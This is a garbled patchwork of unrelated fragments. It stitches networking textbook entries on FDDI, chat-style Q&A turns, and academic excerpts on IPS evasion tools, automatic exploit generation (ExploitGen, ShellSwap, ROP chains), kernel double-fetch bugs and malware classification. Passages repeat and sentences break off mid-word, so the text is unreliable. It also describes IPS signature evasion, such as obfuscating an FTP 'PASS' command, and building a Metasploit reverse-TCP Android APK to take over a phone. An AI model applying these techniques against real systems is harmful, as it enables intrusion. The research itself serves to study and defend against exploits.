LobreeWHEN THE FIRST TELEGRAPH MESSAGE WAS FINALLY SENT, THE START OFTHE ELECTRONIC COMMUNICATIONS AGE WAS BORN. Then about 50 yearsago, people working on a mainframe computer left messages or put a file insomeone else\u2019s directory on a Direct Access Storage Device (DASD) drive,and so the first electronic messaging system was born. Although mostbelieve that electronic mail, or e-mail as it is called today, was started withthe ARPA net, that is not the case. Electronic communication has beenaround for a much longer period than that, and securing that informationhas always been and will always be a major issue for both governmentTypicalrates include a 4:1 compression ratio between DTE and DCE speeds. Thus, for aV.34 modem (28,800 bps), the DTE-DCE rate is 115,200 bps. This rate is userconfigurable.Dual-attachment Station (DAS) An FDDI node that is connected to two full, dual-fiber rings and have the ability to reconfigure the network to form a valid networkfrom components of the two rings in case of a failure. A DAS is also called Class Anode.E.164 An ITU-T standard network addressing format that resemble telephonenumbers. E.164 addresses are 15 decimal digits long and include a country code,area or city code, and a local number. Country codes are two or three digits longand consist of a zone code followed by a one- or two-digit national identifier. Area orcity codes are up to four digits long. If an address contains less than 15 digits, thenit is padded with hexadecimal Fs.FDDI was designed to function as ahigh-speed transport backbone; therefore, FDDI assumes workstations will not attach directly to itsrings, but to a MAU or router, as they cannot keep up with the data transfer rates (see Figure 3.10).Consequently, frequent station power cycles will cause ring reconfigurations; therefore, it isrecommended that directly connected MAUs be powered on at all times.FDDI rings operate in synchronous and asynchronous modes, which are defined as follows:\u2022 Synchronous. Stations are guaranteed a percentage of the total available bandwidth.\u2022 Asynchronous. Stations transmit in restricted or nonrestricted conditions. A restricted stationcan transmit with up to full ring bandwidth for a period of time allocated by stationmanagement; as nonrestricted stations, all available bandwidth, minus restrictions, will bedistributed among the remaining stations.Stations can attach to FDDI as single-attached-stations (SAS) or dual-attached-stations (DAS). SASconnect only to thepair of fibers and can be isolated from the network in the case of sometypes of failure A SAS is also called Class B node.Single Mode Fiber A type of fiber-optic cable with a core diameter ranging from 7\u00b5m to 9 \u00b5m. In single mode fiber, only a single ray of light, called the axial ray, canx0cpass.                   Question: 'What is the difference between SAS and DAS?'[/INST] In the context of Fiber Distributed Data Interface (FDDI), a Single Attached Station (SAS) and a Dual Attached Station (DAS) refer to different ways of connecting devices to the FDDI network.\n\nA Single Attached Station (SAS) is a device that connects to only one of the two fiber rings in an FDDI network. SAS devices are typically simpler and less expensive than DAS devices since they require fewer components. However, they offer less fault tolerance since they rely on a single connection to the network.\n\nOn the other hand, a Dual Attached Station (DAS) is a device that connects to both fiber rings in an FDDI network. DAS devices offer greater fault tolerance since they have multiple paths to transmit data. In the event of a failure on one ring, the DAS device can continue communicating through the other ring. DAS devices are more complex and expensive than SAS devices due to the additional hardware required to manage the multiple connections.\n\nTherefore, the main difference between SAS and DAS is the number of fiber rings they connect to and the level of fault tolerance they offer. SAS devices connect to one ring, while DAS devices connect to both rings."}

Sploit is an evasion testing framework that allows the testers and attackers to develop new attacks and evasion techniques. This tool includes most of the evasion techniques provided by Fragroute, Nikto and ADMmutate. It also implements payload mutation on the messages of application protocolssuch as FTP and IMAP. For example, xff xf1 is a telnet control sequence that de notes \u201cno operation\u201d, so a PASS FTP command can be replaced with Pxff xf1ASS to evade detection by an IPS matching the pattern PASS [8]. Metasploit is a framework for penetration testing, IDS signature development, and exploit research. It supports de-velopment of exploit codes against a remote target host. The Metasploit Framework also provides more polymorphic shellcode encoders [11] than ADMmutate and Sploit. Theencoders allows a penetration tester to mutate the exploit codes for evasion testing. Havij is an automated SQL injection tool to exploit SQL injection vulnerabilities on Web pages. It supports evasion by manipulating white space in the attack strings, replacing space with the comment syntax of the C language, encoding thecharacters in hexadecimal, BASE64, and so on.

An IPS may need to decrypt the encrypted code to restore the original signature, or even emulate the code execution (e.g.,on a sandbox that emulates the execution on the target hosts) to \ufb01nd malicious behavior.

D.Android Malware APK Creation/Hacking To infect the phone, the attack er (PC) created a listener to  act as a terminal to send data back to the attacker device (PC).  Alongside this, we opened an Apache2 web server to store the  infected APK which will be sent to the target device.  After the  listener and web server were established, metasploit was booted up to perform the attack on the device. We first setup the reverse tcp connection to be able to send back data from our unsuspecting victim device, an IP address, and a port where the attacking device could listen to. At this point in the simulation, the researchers would have to perform a sort of social engineering attack for the victim\u2019s device to be infiltrated via  convincing the victim to install the infected apk file we created  but, in this simulation, it is as sumed that the social engineering  attack had already been established. With that, we shall skip over to after the supposed social engineering attack on the  victim had already been done. Now that the attacking device has a connection to the victim,  it was able to send a prompt to download the infected apk to the device. However, before the installation, Play Protect was able  to detect suspicious activity with the file and prompted the user to reconsider installing the app. In this scenario, we assume the  attackers were able to social engineer their way into conv incing  the victim to move forward in installing regardless of the warning by Play Protect . After installation of the app was  complete, a connection would be established with our listener as  seen in the image below.  Connecting to the session established gives the attacker full  access to the android device given the following commands that  could be prompted by the attacker as shown in the Figure 2.# Corelan Cybersecurity Research  ## :: Knowledge is not an object, its a flow ::    * Home   *   * Articles   *   * Free Tools     * AD & CS       * AD Disable Users       * Certificate List Utility       * PVE Find AD User     * Exchange Transport Agents       * Attachment filter       * Attachment rename     * Networking       * Cisco switch backup utility       * Network monitoring with powershell       * TCP Ping     * Security Related Tools   *   * Security     * Corelan Team Members       * Corelan Team Membership     * __Corelan Training \"Corelan Live\u2026     * Exploit writing tutorials     * Metasploit       * FTP Client fuzzer       * HTTP Form field fuzzer       * Simple FTP Fuzzer - Metasploit\u2026     * Nessus/Openvas ike-scan wrapper     * Vulnerability Disclosure Policy     * __mona.py PyCommand for Immunity Debugger       * __Download mona.py       * Mona.py - documentation     * Corelan ROPdb     * Mirror for BoBs Immunity Debugger\u2026   *   * Terms of use   *   * Donate   *   * About\u2026     * About Corelan Team     * About me     * Antivirus/antimalware     * Corelan public keys     * Sitemap         \u00ab Offensive Security Hacking Tournament - How strong was my fu ?

However, automatic generation of exploit code for security assessment is a challenging task. In this paper, we propose a novel template-augmented exploit code generation approach ExploitGen based on CodeBERT. Specifically, we first propose a rule-based Template Parser to generate template-augmented natural language descriptions (NL). Both the raw and template-augmented NL sequences are encoded to context vectors by the respective encoders. For better learning semantic information, ExploitGen incorporates a semantic attention layer, which uses the attention mechanism to extract and calculate each layer\u2019s representational information. In addition, ExploitGen computes the interaction information between the template information and theet al., 2020) (i.e., Domain-Adaptive Pre-training and Task- Adaptive Pre-training) to continue pre-training the CodeBERT, and obtain the fine-grained CodeBERT (FG-CodeBERT). Therefore, in the sequel, CodeBERT used in ExploitGen denotes FG-CodeBERT in the rest of this paper. Motivation.executes the instructions of the original exploit path in the \ufb01rst phase and the new shellcode in the second phase, that input represents the modi\ufb01ed exploit. Given these inputs, it proceeds through a number of steps, as diagrammed in Figure 1. The steps for generating the new exploit are as follows: Symbolic Tracing. The path generator replays the exploit in an isolated environment and records the executed instructions. The output of the path generator is a sequence of instruction addresses, which we call the dynamic exploit path . The path generator passes the dynamic exploit path to the symbolic tracing engine. Then tracer sets the input from the exploit as a symbolic value and starts symbolically executing the program. At every step of this execution, the tracer checks if the current program state violates a security policy. There are two reasons for this: a) we want to double check that the exploit succeeds, and b) we need to get the end of the normal execution and the start of malicious computation, where the exploit diverts the control \ufb02ow of the program to the shellcode. When the tracer detects that the security policy has been violated, it considers the trace complete and the exploitable state reached. The tracing engine records the path constraints introduced by the program on the exploit input in order to reach the exploitable state, and the memory contents of the exploitable state itself. These will be used in the next step to surmount challenges associated with shellcode transplanting. Shellcode Transplant. Shellcode transplant is the critical step in the ShellSwap system. It takes the exploitable state, the 825 Authorized licensed use limited to: University of Pisa. Downloaded on December 08,2023 at 16:16:34 UTC from IEEE Xplore.  Restrictions apply.Original  Exploit  Vulnerable  Program Symbolic Tracing Exploitable  State  Path  Constraints Shellcode Transplant Replacement  Shellcode  Modified Exploit  or  Not Foundadvantage of shellcode transplanting. In investigating this problem, we identi\ufb01ed three main challenges to tackling the shellcode transplant problem . First, it is very dif\ufb01cult to separate the shellcode from the rest of an exploit, as there is generally no clear boundary separating one from the other. Second, as an exploit\u2019s shellcode isit is very dif\ufb01cult to separate the shellcode from the rest of an exploit, as there is generally no clear boundary separating one from the other. Second, as an exploit\u2019s shellcode is commonly constructed through non-trivial data transformations, even if the bytes representing the original shellcode could be separated from the exploit, rewriting these bytes to a replacement shellcode would be non-trivial. Third, the shellcode and the remainder of the content in an exploit can be mutually dependent on each other (e.g., a \ufb01eld in the exploit payload may dictate the size of the embedded shellcode). Such relations can pose potentially complex constraints on any replacement shellcode that might be transplanted. When those constraints are violated by replacement shellcode, it is challenging to modify the exploit and/or the replacement shellcode in order for the modi\ufb01ed exploit to function properly. Previous work in the \ufb01eld of automated exploit generation generates exploits by constraining the memory bytes in each attacker-controlled buffer to the target shellcode. They enumer- ate all possible offsets in every attacker-controlled buffer until a solution is found [ 12,17]. Such methods are insuf\ufb01cient. In the worst case, when attempting to compensate for the case of con\ufb02icting constraints on the replacement shellcode, these methods degenerate to a symbolic exploration of the program, which generally ends in a path explosion problem or is hampered by the inability of the symbolic execution engine to ef\ufb01ciently reverse complex data transformations.

[3] pro- posed a new code reuse technology named Return-Oriented Programming (ROP). Currently, ROP is the most basic and popular attack technology. However, this attack still uses manual analysis and construction, which is low ef\ufb01cient and high costly. In the trend that software functions are increasingly com- plex, and vulnerabilities are increasingly diverse, traditional approaches have been dif\ufb01cult to cope with these challenges. Therefore, we need to \ufb01nd new ways. It is an inevitable trend to introduce automation technology into the exploit, which is called Automatic Exploit Gen- eration (AEG) [4], [5]. AEG is rarely considered in terms of bypassing defenses, but it is still widely used due to its high ef\ufb01ciency and low cost in \ufb01nding vulnerabilities and 120152 This work is licensed under a Creative Commons Attribution 4.0 License.

After decades of development, AEG has become a mature subject and produces a lot of practical solu- tions. Currently, AEG includes the following three aspects: Patch-Based Exploit Generation. Brumley et al. [6] proposed an automatic exploit generation method based on the comparison between the original program and the patched program. Automatic Patch-Based Exploit Generation (APEG) is the \ufb01rst attempt to generate exploit automatically. Although the idea is relatively simple, it has strong oper- ability, which can cause the collapse of the original program while the control-\ufb02ow hijacking does not succeed.

Tested with data from 6 open-source international Capture The Flag (CTF) competitions and 3 Common Vulnerabilities & Exposures (CVE)s, this technology successfully generated ROP chains for all of them. According to the obtained results, our technique can automatically create ROP payloads and reduce up to 80% of ROP exploit payloads. It takes only 3-5 seconds to exploit successfully, compared to manual analysis for at least 60 minutes, as well as it can effectively bypass both Write XOR Execute (W \u2295X) and ASLR.

INTRODUCTION Exploit is one of the most common ways to attack the com- puter system. How to \ufb01nd and analyze the vulnerabilities quickly is the key problem of exploit. Traditional exploit is mainly generated manually, which requires not only compre- hensive system underlying knowledge, including knowledge about \ufb01le system, assembly language, operating system, pro- cessor architecture, etc., but also in-depth, careful studies and analysis of the attacking principles of exploit. Only in this way can we achieve the purpose of the attack. With the emergence of defense technologies such as W\u2295X [1] and ASLR [2] which make control-\ufb02ow hijacks dif\ufb01cult to exploit, attackers turn to execute elaborately chosen machine instruction sequences that are already The associate editor coordinating the review of this article and approving it for publication was Chi-Yuan Chen.existing in the machine\u2019s memory. This approach allows an attacker to perform arbitrary operations on a machine which deployed defenses. Thus, in 2007, Shacham et al. [3] pro-method ExploitGen based on CodeBERT. The results of the automated evaluation show that our proposed method ExploitGen outperforms the state-of-the-art baselines from the previous studies of automatic code generation on the two corpora. Moreover, we also verify the input lengths, input formats rationality, training methods rationality, and model com- ponents rationality of ExploitGen by designing a set of ablation experiments. We design an additional human study to evaluate the quality of the generated code in terms of syntactic correctness and semantic correctness. There are a number of applications of exploit code. For in- stance, for security assessment writing exploit code is indis- pensable, but its manual development turns out to be costly. Our approach can accelerate this process and reduce the cost for practitioners. Moreover, researchers can adopt our approach to generate exploit code which can facilitate the research of detection and defense of exploit code. For future work,Table 4.

For the Assembly dataset, ExploitGen achieves 8.77% to 37.16%, 5.63% to 17.82%, and 5.58% to 34.43% improvements over the base- lines in terms of BLEU-4, ROUGE-W, and Exact Match Accuracy respectively. Therefore, compared to the baselines, ExploitGen outperforms all the six baselines in terms of three metrics on the two datasets. In addition, we show two examples with the ground-truth exploit code and the exploit code generated by ExploitGen and all baselines in the Python dataset and the Assembly dataset respectively. From Table 5, we can observe that ExploitGen can generate higher quality code compared to baselines. To examine the performance difference in view of each com- parison between ExploitGen and baselines, We use Wilcoxon signed-rank test to examine whether the performance difference is statistically significant in terms ofDataset Approach BLEU-4 (%) ROUGE-W (%) Accuracy (%) Python Assembly RQ1: How effective is ExploitGen compared with the state-of-the- art baselines?. In this RQ, we want to investigate how effective ExploitGen is and how much performance improvement Exploit- Gen can achieve over the state-of-the-art baselines. As intro- duced in Section 4.1, we use six state-of-the-art source code generation techniques as baselines. Since in the automatic ex- ploit code generation task, we use the Template Parser to parse the raw NL and get the template-augmented NL and template- augmented code. To guarantee a fair comparison between Ex- ploitGen and baselines, we also apply this component to our considered baselines.

Given these inputs, it proceeds through a number of steps, as diagrammed in Figure 1. The steps for generating the new exploit are as follows: Symbolic Tracing. The path generator replays the exploit in an isolated environment and records the executed instructions. The output of the path generator is a sequence of instruction addresses, which we call the dynamic exploit path . The path generator passes the dynamic exploit path to the symbolic tracing engine. Then tracer sets the input from the exploit as a symbolic value and starts symbolically executing the program. At every step of this execution, the tracer checks if the current program state violates a security policy. There are two reasons for this: a) we want to double check that the exploit succeeds, and b) we need to get the end of the normal execution and the start of malicious computation, where the exploit diverts the control \ufb02ow of the program to the shellcode. When the tracer detects that the security policy has been violated, it considers the trace complete and the exploitable state reached. The tracing engine records the path constraints introduced by the program on the exploit input in order to reach the exploitable state, and the memory contents of the exploitable state itself.

In investigating this problem, we identi\ufb01ed three main challenges to tackling the shellcode transplant problem . First, it is very dif\ufb01cult to separate the shellcode from the rest of an exploit, as there is generally no clear boundary separating one from the other. Second, as an exploit\u2019s shellcode isit is very dif\ufb01cult to separate the shellcode from the rest of an exploit, as there is generally no clear boundary separating one from the other. Second, as an exploit\u2019s shellcode is commonly constructed through non-trivial data transformations, even if the bytes representing the original shellcode could be separated from the exploit, rewriting these bytes to a replacement shellcode would be non-trivial. Third, the shellcode and the remainder of the content in an exploit can be mutually dependent on each other (e.g., a \ufb01eld in the exploit payload may dictate the size of the embedded shellcode). Such relations can pose potentially complex constraints on any replacement shellcode that might be transplanted. When those constraints are violated by replacement shellcode, it is challenging to modify the exploit and/or the replacement shellcode in order for the modi\ufb01ed exploit to function properly. Previous work in the \ufb01eld of automated exploit generation generates exploits by constraining the memory bytes in each attacker-controlled buffer to the target shellcode. They enumer- ate all possible offsets in every attacker-controlled buffer until a solution is found [ 12,17]. Such methods are insuf\ufb01cient. In the worst case, when attempting to compensate for the case of con\ufb02icting constraints on the replacement shellcode, these methods degenerate to a symbolic exploration of the program, which generally ends in a path explosion problem or is hampered by the inability of the symbolic execution engine to ef\ufb01ciently reverse complex data transformations.

INTRODUCTION Exploit is one of the most common ways to attack the com- puter system. How to \ufb01nd and analyze the vulnerabilities quickly is the key problem of exploit. Traditional exploit is mainly generated manually, which requires not only compre- hensive system underlying knowledge, including knowledge about \ufb01le system, assembly language, operating system, pro- cessor architecture, etc., but also in-depth, careful studies and analysis of the attacking principles of exploit. Only in this way can we achieve the purpose of the attack. With the emergence of defense technologies such as W\u2295X [1] and ASLR [2] which make control-\ufb02ow hijacks dif\ufb01cult to exploit, attackers turn to execute elaborately chosen machine instruction sequences that are already The associate editor coordinating the review of this article and approving it for publication was Chi-Yuan Chen.existing in the machine\u2019s memory. This approach allows an attacker to perform arbitrary operations on a machine which deployed defenses. Thus, in 2007, Shacham et al. [3] pro-method ExploitGen based on CodeBERT. The results of the automated evaluation show that our proposed method ExploitGen outperforms the state-of-the-art baselines from the previous studies of automatic code generation on the two corpora. Moreover, we also verify the input lengths, input formats rationality, training methods rationality, and model com- ponents rationality of ExploitGen by designing a set of ablation experiments. We design an additional human study to evaluate the quality of the generated code in terms of syntactic correctness and semantic correctness. There are a number of applications of exploit code. For in- stance, for security assessment writing exploit code is indis- pensable, but its manual development turns out to be costly. Our approach can accelerate this process and reduce the cost for practitioners.

In neural code generation, the most essential step is to repre- sent the semantic information of the natural language (NL) and to generate the correct code. However a semantic discrepancy is largely present between NL and programming languages (PL). To bridge such gap and better understand the semantic information of NL, researchers proposed CodeBERT (Feng et al., 2020), a lan- guage model that uses the masked language model and replaced token detection method to pre-trainthe module name in NL does not match the module name in the code, it will also cause the Template Parser restore to fail. Manually analyzing all the problematic data is laborious and time-consuming. Therefore we alleviate this problem by con- sidering dual encoders. Specifically, ExploitGen uses Raw En- coder to encode the raw NL and uses Temp Encoder to encode template-augmented NL respectively. Raw Encoder. The Raw Encoder encodes the tokens of raw NL and aims to learn the origin information within it. The encoder is based on CodeBERT, which is described in Section 2. For a raw NL, the Raw Encoder first tokenizes the inputs by the pretrained Byte-level BPE (Wang et al., 2020) and obtains the sequence X = x1 , . . . , xn , where n is the length of this sequence. Since the sequence length may be different for different inputs, we use a padding operation to unify the sequence length to facilitate the processing of the model. Supposing the maximum input length is N, for the sequencesSecur. , 2015, pp. 611\u2013626. [31] K. Pei, J. Guan, D. W. King, J. Yang, and S.

CodeBERT (Feng et al., 2020) is a bimodal programming lan- guage (PL) and natural language (NL) oriented pre-training model, which is based on the Transformer architecture (Vaswani et al., 2017). CodeBERT is pre-trained on a large-scale dataset Code- SearchNet (Husain et al., 2019), which includes 2.1M bimodal data and 6.4M unimodal data with both bimodal NL-PL pairs data and unimodal code data. The CodeBERT pre-training data is based on six programming languages (i.e.shown in Table 6 and we find all the p-values are lower than 0.05. These statistical results can lead to the rejection of the null hypothesis, which means that there exists a significant difference between our approach and baselines in terms of all the considered metrics.

Traditional exploit is mainly generated manually, which requires not only compre- hensive system underlying knowledge, including knowledge about \ufb01le system, assembly language, operating system, pro- cessor architecture, etc., but also in-depth, careful studies and analysis of the attacking principles of exploit. Only in this way can we achieve the purpose of the attack. With the emergence of defense technologies such as W\u2295X [1] and ASLR [2] which make control-\ufb02ow hijacks dif\ufb01cult to exploit, attackers turn to execute elaborately chosen machine instruction sequences that are already The associate editor coordinating the review of this article and approving it for publication was Chi-Yuan Chen.existing in the machine\u2019s memory. This approach allows an attacker to perform arbitrary operations on a machine which deployed defenses. Thus, in 2007, Shacham et al. [3] pro-method ExploitGen based on CodeBERT. The results of the automated evaluation show that our proposed method ExploitGen outperforms the state-of-the-art baselines from the previous studies of automatic code generation on the two corpora. Moreover, we also verify the input lengths, input formats rationality, training methods rationality, and model com- ponents rationality of ExploitGen by designing a set of ablation experiments. We design an additional human study to evaluate the quality of the generated code in terms of syntactic correctness and semantic correctness. There are a number of applications of exploit code. For in- stance, for security assessment writing exploit code is indis- pensable, but its manual development turns out to be costly. Our approach can accelerate this process and reduce the cost for practitioners. Moreover, researchers can adopt our approach to generate exploit code which can facilitate the research of detection and defense of exploit code. For future work,To adapt these low-resource tasks, they designed a normalization method Adjust_QKNorm. Finally, to alleviate the problem of out-of-vocabulary, they proposed a rule-based repair component to improve the performance of shellcode genera- tion. Liguori et al. (2021b) extended the Shellcode IA32 dataset and presented a method (EVIL) for generating exploit code in As- sembly/Python from natural language descriptions. In our paper, we also conduct empirical studies on their released dataset. Compared with previous exploit code generation studies that were largely based on deep learning, our approach complements the data-driven methods with rule-based template information and achieves promising results. 8. Conclusion and future work In this paper, we propose the template-augmented exploit code generation method ExploitGen based on CodeBERT. The results of the automated evaluation show that our proposed method ExploitGen outperforms the state-of-the-art baselines from the previous studies ofvar1 , byte [esi] DualSC: negate all CodeGPT: nop CodeGPT-adapted: pop byte [esi] CodeBERT: nop ExploitGen: not byte [esi] Ground Truth: not byte [esi] draw a conclusion that ExploitGen significantly achieves better performance than other baseline approaches. Summary for RQ1 ExploitGen can significantly outperform the baselines in terms of three performance metrics on both the Python dataset and the Assembly dataset. RQ2: How effective is ExploitGen in terms of syntactic correct- ness and semantic correctness?. Although the results show that ExploitGen can correctly generate individual lines of code with high probability in automatic evaluation, we need to verify the performance of ExploitGen for generating the entire software exploit code. At the same time, we find that there are semanti- cally identical but written differently codes (e.g., in Python code, a += b is exactly equivalent to a = a + b ). This implies that automatic evaluation may not correctly reflect the performance ofber of lines of code for the program. Sem indicates the number of semantic correctness lines in the generated code. Syn indi- cates the number of syntactic correctness lines in the generated code. Based on these results, we find that although our approach achieves high accuracy for code generation tasks at the line-level granularity, there is still much room for improvement for code generation tasks at the granularity of the entire program. Summary for RQ2 ExploitGen can achieve high accuracy at the line-level granularity but still needs improvement at program-level granularity. RQ3: What is the impact of different NL lengths and code lengths on the performance of ExploitGen ?. To explore how do the different NL lengths and code lengths effect the performance of ExploitGen, we further analyzed the ROUGE-W metrics score of different NL lengths and code lengths for our proposed approach and the baselines.

In neural code generation, the most essential step is to repre- sent the semantic information of the natural language (NL) and to generate the correct code. However a semantic discrepancy is largely present between NL and programming languages (PL). To bridge such gap and better understand the semantic information of NL, researchers proposed CodeBERT (Feng et al., 2020), a lan- guage model that uses the masked language model and replaced token detection method to pre-trainthe module name in NL does not match the module name in the code, it will also cause the Template Parser restore to fail. Manually analyzing all the problematic data is laborious and time-consuming. Therefore we alleviate this problem by con- sidering dual encoders. Specifically, ExploitGen uses Raw En- coder to encode the raw NL and uses Temp Encoder to encode template-augmented NL respectively. Raw Encoder. The Raw Encoder encodes the tokens of raw NL and aims to learn the origin information within it. The encoder is based on CodeBERT, which is described in Section 2. For a raw NL, the Raw Encoder first tokenizes the inputs by the pretrained Byte-level BPE (Wang et al., 2020) and obtains the sequence X = x1 , . . . , xn , where n is the length of this sequence. Since the sequence length may be different for different inputs, we use a padding operation to unify the sequence length to facilitate the processing of the model. Supposing the maximum input length is N, for the sequencesSecur. , 2015, pp. 611\u2013626. [31] K. Pei, J. Guan, D. W. King, J. Yang, and S.

Section 7 reviews the related work, and Section 8 concludes the paper. In this section, we introduce the background of CodeBERT and exploit code. CodeBERT (Feng et al., 2020) is a bimodal programming lan- guage (PL) and natural language (NL) oriented pre-training model, which is based on the Transformer architecture (Vaswani et al., 2017). CodeBERT is pre-trained on a large-scale dataset Code- SearchNet (Husain et al., 2019), which includes 2.1M bimodal data and 6.4M unimodal data with both bimodal NL-PL pairs data and unimodal code data. The CodeBERT pre-training data is based on six programming languages (i.e.shown in Table 6 and we find all the p-values are lower than 0.05. These statistical results can lead to the rejection of the null hypothesis, which means that there exists a significant difference between our approach and baselines in terms of all the considered metrics. Note that the results listed in Table 4 show that our approach outperforms other baselines, so we can Examples of the ground truth exploit code, and the exploit code generated by ExploitGen and all baselines.

However, automatic generation of exploit code for security assessment is a challenging task. In this paper, we propose a novel template-augmented exploit code generation approach ExploitGen based on CodeBERT. Specifically, we first propose a rule-based Template Parser to generate template-augmented natural language descriptions (NL). Both the raw and template-augmented NL sequences are encoded to context vectors by the respective encoders. For better learning semantic information, ExploitGen incorporates a semantic attention layer, which uses the attention mechanism to extract and calculate each layer\u2019s representational information. In addition, ExploitGen computes the interaction information between the template information and theet al., 2020) (i.e., Domain-Adaptive Pre-training and Task- Adaptive Pre-training) to continue pre-training the CodeBERT, and obtain the fine-grained CodeBERT (FG-CodeBERT).

Motivation.executes the instructions of the original exploit path in the \ufb01rst phase and the new shellcode in the second phase, that input represents the modi\ufb01ed exploit. Given these inputs, it proceeds through a number of steps, as diagrammed in Figure 1. The steps for generating the new exploit are as follows: Symbolic Tracing. The path generator replays the exploit in an isolated environment and records the executed instructions. The output of the path generator is a sequence of instruction addresses, which we call the dynamic exploit path . The path generator passes the dynamic exploit path to the symbolic tracing engine. Then tracer sets the input from the exploit as a symbolic value and starts symbolically executing the program. At every step of this execution, the tracer checks if the current program state violates a security policy. There are two reasons for this: a) we want to double check that the exploit succeeds, and b) we need to get the end of the normal execution and the start of malicious computation, where the exploit diverts the control \ufb02ow of the program to the shellcode. When the tracer detects that the security policy has been violated, it considers the trace complete and the exploitable state reached. The tracing engine records the path constraints introduced by the program on the exploit input in order to reach the exploitable state, and the memory contents of the exploitable state itself. These will be used in the next step to surmount challenges associated with shellcode transplanting. Shellcode Transplant. Shellcode transplant is the critical step in the ShellSwap system.

In investigating this problem, we identi\ufb01ed three main challenges to tackling the shellcode transplant problem . First, it is very dif\ufb01cult to separate the shellcode from the rest of an exploit, as there is generally no clear boundary separating one from the other. Second, as an exploit\u2019s shellcode isit is very dif\ufb01cult to separate the shellcode from the rest of an exploit, as there is generally no clear boundary separating one from the other. Second, as an exploit\u2019s shellcode is commonly constructed through non-trivial data transformations, even if the bytes representing the original shellcode could be separated from the exploit, rewriting these bytes to a replacement shellcode would be non-trivial. Third, the shellcode and the remainder of the content in an exploit can be mutually dependent on each other (e.g., a \ufb01eld in the exploit payload may dictate the size of the embedded shellcode). Such relations can pose potentially complex constraints on any replacement shellcode that might be transplanted. When those constraints are violated by replacement shellcode, it is challenging to modify the exploit and/or the replacement shellcode in order for the modi\ufb01ed exploit to function properly. Previous work in the \ufb01eld of automated exploit generation generates exploits by constraining the memory bytes in each attacker-controlled buffer to the target shellcode. They enumer- ate all possible offsets in every attacker-controlled buffer until a solution is found [ 12,17]. Such methods are insuf\ufb01cient. In the worst case, when attempting to compensate for the case of con\ufb02icting constraints on the replacement shellcode, these methods degenerate to a symbolic exploration of the program, which generally ends in a path explosion problem or is hampered by the inability of the symbolic execution engine to ef\ufb01ciently reverse complex data transformations.

[3] pro- posed a new code reuse technology named Return-Oriented Programming (ROP). Currently, ROP is the most basic and popular attack technology. However, this attack still uses manual analysis and construction, which is low ef\ufb01cient and high costly. In the trend that software functions are increasingly com- plex, and vulnerabilities are increasingly diverse, traditional approaches have been dif\ufb01cult to cope with these challenges. Therefore, we need to \ufb01nd new ways. It is an inevitable trend to introduce automation technology into the exploit, which is called Automatic Exploit Gen- eration (AEG) [4], [5]. AEG is rarely considered in terms of bypassing defenses, but it is still widely used due to its high ef\ufb01ciency and low cost in \ufb01nding vulnerabilities and 120152 This work is licensed under a Creative Commons Attribution 4.0 License.

After decades of development, AEG has become a mature subject and produces a lot of practical solu- tions. Currently, AEG includes the following three aspects: Patch-Based Exploit Generation. Brumley et al. [6] proposed an automatic exploit generation method based on the comparison between the original program and the patched program. Automatic Patch-Based Exploit Generation (APEG) is the \ufb01rst attempt to generate exploit automatically. Although the idea is relatively simple, it has strong oper- ability, which can cause the collapse of the original program while the control-\ufb02ow hijacking does not succeed.

Tested with data from 6 open-source international Capture The Flag (CTF) competitions and 3 Common Vulnerabilities & Exposures (CVE)s, this technology successfully generated ROP chains for all of them. According to the obtained results, our technique can automatically create ROP payloads and reduce up to 80% of ROP exploit payloads. It takes only 3-5 seconds to exploit successfully, compared to manual analysis for at least 60 minutes, as well as it can effectively bypass both Write XOR Execute (W \u2295X) and ASLR.

They use tools like Wireshark to capture and analyze the data packets transmitted between two parties. Since the attacker doesn't modify the data, this method is considered less intrusive and harder to detect. However, it is limited to decrypting unencrypted data or plaintext communications.\n\nOn the other hand, active MITM attacks involve the attacker interfering with the communication flow by injecting malicious content into the conversation. In this scenario, the attacker impersonates one of the communicating parties and deceives both ends into believing they are communicating directly with each other. This allows the attacker to eavesdrop on the conversation, modify the data being transmitted, or even inject new data into the communication stream. Active MITM attacks can be more dangerous than passive sniffing since they can manipulate encrypted data and are generally harder to detect.\n\nOne significant difference between passive sniffing and active MITM attacks is that passive sniffing cannot decrypt encrypted network traffic, while active MITM attacks can. Encryption protocols like SSL/TLS protect data from passive attacks, but they do not prevent active MITM attacks."}

Finally, drivers of- ten have to copy messages of variable type or variable length from the user space to the hardware, and, as we will see later, this often leads to double-fetch situations that cause vulnerabilities. In Linux, all devices have a \ufb01le representation which can be accessed from user space to interact with the hard- ware\u2019s driver. The kernel creates a \ufb01le in the /dev di- rectory for each driver, with which user space processes can interact using \ufb01le input /output system calls. The driver provides implementations of all \ufb01le related op- erations, including read() andwrite() functions. In such functions, the driver needs to fetch the data from 2https: //support.microsoft.com /en-us /kb/191840 preparedataclonesyscallmaliciousupdate1st fetch(check)2nd fetch(real use)entryKernel SpaceUser Spaceuser datatimeFigure 1: Principal Double Fetch Race Condition the user space (in write ) or copy data to the user space (inread ). The driver uses the transfer functions to do so, and again, any double fetch will involve multiple invoca- tions of transfer functions. 2.3 Double Fetch A double fetch is a special case of a race condition that occurs in memory access between the kernel and user space. The \ufb01rst vulnerability of this type was pre- sented by Serna [32] in a report on Windows double- fetch vulnerabilities. Technically, a double fetch takes place within a kernel function, such as a syscall, which is invoked by a user application from user mode. As il- lustrated in Figure 1, the kernel function fetches a value twice from the same memory location in the user space, the \ufb01rst time to check and verify it and the second time to use it (note that the events are on a timeline from left to right, but the user data is the same object all the time). Meanwhile, within the time window between the two kernel fetches, a concurrently running user thread modi-outperformed a model based on the long short-term memory  (LSTM) architecture [7] for the task of malware classification.  The contributions of this paper are as follows:  \u2022 We are the first to propose the application of attention and  transformer architecture to the analysis of system call  sequences for unknown malware classification.  \u2022 We are the first to explore and shed light on the influence  of the system call sequence\u2019s length on both malware  classification accuracy and performance time (training  and classifying).  \u2022 We show that the use of transformer architecture can save  up to 75% of the training and prediction time, which  makes our proposed solution an applicable malware  classification tool.  978-0-7381-3366-9/21/$31.00 \u00a92021 IEEE2021 International Joint Conference on Neural Networks (IJCNN) | 978-1-6654-3900-8/21/$31.00 \u00a92021 IEEE | DOI: 10.1109/IJCNN52387.2021.9533481 Authorized licensed use limited to: University of Pisa.

